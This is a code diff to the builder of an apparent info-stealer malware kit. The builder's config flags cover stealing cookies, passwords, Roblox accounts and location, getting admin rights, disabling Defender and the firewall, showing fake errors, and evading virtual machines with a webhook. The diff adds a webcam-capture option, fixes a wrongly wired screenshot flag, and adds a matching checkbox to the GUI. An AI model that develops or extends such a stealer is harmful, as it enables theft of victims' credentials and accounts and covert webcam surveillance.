@@ -75,7 +75,8 @@ data_builder = {
     "disable_defender": False,
     "disable_firewalls": False,
     "vm_detect": False,
-    "vm_webhook_url": ""
+    "vm_webhook_url": "",
+    "webcam": False
 }
 
 links = {
@@ -216,7 +217,7 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("malicious_stealing = False", f"malicious_stealing = {data_builder['malicious']}") \
                 .replace("location_stealing = False", f"location_stealing = {data_builder['location']}") \
                 .replace("roblox_stealing = False", f"roblox_stealing = {data_builder['roblox']}") \
-                .replace("screenshot = False", f"screenshot = {data_builder['roblox']}") \
+                .replace("screenshot = False", f"screenshot = {data_builder['screenshot']}") \
                 .replace("discord_ping = False", f"discord_ping = {data_builder['ping']}") \
                 .replace("get_admin = False", f"get_admin = {data_builder['get_admin']}") \
                 .replace("disable_defender = False", f"disable_defender = {data_builder['disable_defender']}") \
@@ -224,7 +225,9 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
                 .replace("nitro_auto_buy = False", f"nitro_auto_buy = {data_builder['nitro_buy']}") \
                 .replace("vmdetection = False", f"vmdetection = {data_builder['vm_detect']}") \
-                .replace("VMHOOK", f"{data_builder['vm_webhook_url']}")  # noqa: E501
+                .replace("VMHOOK", f"{data_builder['vm_webhook_url']}") \
+                .replace("webcam = False", f"webcam = {data_builder['webcam']}")
+                 # noqa: E501
                 
             with open(f"{path}\\config.py", "w", encoding="utf-8") as f:
                 f.write(new)
@@ -340,7 +343,8 @@ def _functions():
                     ui.checkbox('Cookie', on_change=lambda e: change_data('cookie', e.value)).props('inline color=green')
                     ui.checkbox('Password', on_change=lambda e: change_data('password', e.value)).props('inline color=green')
                     ui.checkbox('Screenshot', on_change=lambda e: change_data('screenshot', e.value)).props('inline color=green')
-
+                    ui.checkbox('Webcam', on_change=lambda e: change_data('webcam', e.value)).props('inline color=green')
+                    
                 with ui.column():
                     ui.checkbox('Malicious', on_change=lambda e: change_data('malicious', e.value)).props('inline color=green')
                     ui.checkbox('Location', on_change=lambda e: change_data('location', e.value)).props('inline color=green')
